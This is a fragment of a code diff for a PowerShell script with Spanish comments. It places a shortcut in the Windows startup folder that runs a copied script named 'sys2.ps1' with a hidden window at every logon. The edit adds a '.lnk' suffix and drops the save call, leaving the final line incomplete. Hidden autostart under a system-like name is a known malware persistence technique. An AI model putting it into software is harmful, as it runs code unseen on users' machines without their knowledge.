@@ -109,7 +109,7 @@ $scriptInStartupScriptPath = Join-Path -Path $startupFolder -ChildPath "sys2.ps1
 $shell = New-Object -ComObject WScript.Shell
 
 # Crear el acceso directo del script en la carpeta de inicio
-$shortcut = $shell.CreateShortcut($scriptInStartupScriptPath)
+$shortcut = $shell.CreateShortcut("$scriptInStartupScriptPath.lnk")
 $shortcut.TargetPath = "powershell.exe"
 $shortcut.Arguments = "-WindowStyle Hidden -File $scriptInStartupScriptPath"
-$shortcut.Save()
+$shortcut
